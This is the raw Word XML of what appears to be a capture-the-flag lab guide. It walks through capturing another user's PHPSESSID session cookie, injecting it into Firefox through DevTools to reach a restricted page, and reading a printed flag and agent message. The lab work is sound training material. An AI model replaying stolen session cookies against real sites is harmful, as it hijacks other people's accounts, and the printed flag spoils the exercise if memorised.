        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2160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  <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>I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  <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>mp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  <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>ort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  <w:highlight w:val="yellow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  <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">nt: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  <w:highlight w:val="yellow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  <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>he default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  <w:highlight w:val="yellow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  <w:highlight w:val="yellow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  <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>ookie lifetime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  <w:highlight w:val="yellow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  <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>is o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  <w:highlight w:val="yellow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  <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>ly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  <w:highlight w:val="yellow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  <w:highlight w:val="yellow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  <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>b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  <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">out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  <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>2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  <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>0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  <w:highlight w:val="yellow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  <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>m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  <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>inute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  <w:highlight w:val="yellow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  <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>.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If n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ar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y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, repeat</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="28"/>
        <w:ind w:left="2160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Fl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g6 Step 5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“I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mp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er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4"/>
          <w:szCs w:val="24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ate Mannie” to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p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ture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a fre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h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ookie from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Man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ie.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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2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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Inject</w:t>
      </w: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the Cookie in Fire</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>f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ox</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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In 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erm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l,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open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Fire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ox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in p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v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e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br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ow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ing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e:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>firefox -</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>private</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>window</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="auto"/>
        <w:ind w:left="1800" w:right="3523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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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v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igate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 the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get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si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e –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log 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n. Just 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me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g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. c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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Pr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1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2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o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en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ev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To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ol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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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ick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orage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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19" w:line="258" w:lineRule="auto"/>
        <w:ind w:left="1800" w:right="6998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e.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="25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In the l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ne, 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x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pa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d Cookie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.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.   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="18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ick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he target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w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si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e.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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g.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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Inject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PSESS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ID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kie:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2160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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>If PHPSESSID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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>already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4"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single" w:color="404040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4"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>x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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>ists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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="2160" w:right="3681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le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-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click i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v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lue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pa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nnie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’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ookie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(n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er only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–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e.g.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8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e7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5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28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439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6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4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2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7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4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8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7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955e2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8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7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9569b).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2160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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>If PHPSESSID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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>does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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>not 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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>x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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>ist:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="368" w:lineRule="auto"/>
        <w:ind w:left="2160" w:right="5034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Right-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li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k in the cookie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list and choose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 xml:space="preserve"> A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dd I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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m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. Set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he follo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w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ing:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Name: PHPSESSID</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Value: (Mannie’s cookie number)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Path: /</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2520"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Host: &lt;target IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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3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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Acc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the R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>es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tr</w:t>
      </w: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ic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 xml:space="preserve">ted </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>P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age</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Keep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e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br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ow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er open.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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In the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URL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,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v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igate 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o:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>http://&lt;target IP&gt;/mannie_docs.php</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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V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eri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y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t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e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g ap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s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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4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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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 xml:space="preserve">Capture the </w:t>
      </w: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F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inal Flag</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/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pacing w:val="1"/>
          <w:position w:val="-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 xml:space="preserve">.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="22"/>
          <w:position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position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ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1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1"/>
          <w:position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1"/>
          <w:position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3"/>
          <w:position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 xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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pacing w:val="-3"/>
          <w:position w:val="-1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1"/>
          <w:position w:val="-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color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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position w:val="-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lag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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2"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>here:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/>
        <w:ind w:left="252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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>FLA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve">                       </w:t>
      </w:r>
      <w:r w:rsidR="009B0B5F" w:rsidRPr="009B0B5F">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>FLAG{4b0e3f760ae0}</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                               </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-54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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="19" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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5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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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>B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read</w:t>
      </w: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ru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>m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b</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="23" w:line="245" w:lineRule="auto"/>
        <w:ind w:left="2160" w:right="1569" w:hanging="360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Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-37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Acc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ing this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 xml:space="preserve"> p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age as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Man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ie reveals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a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r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y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p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tic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y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4"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24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em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 xml:space="preserve"> m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age. Find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and read the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m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age:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="2520" w:right="1233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6F2F9F"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Mannie Agent v7.14 - Remote Sync Complete. Log upload pending... Path: /opt/automations/mannie/manifest.json</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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6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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Log O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>u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 xml:space="preserve">t </w:t>
      </w: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>a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t>nd Clean Up</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Open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ev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ls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ga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n.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
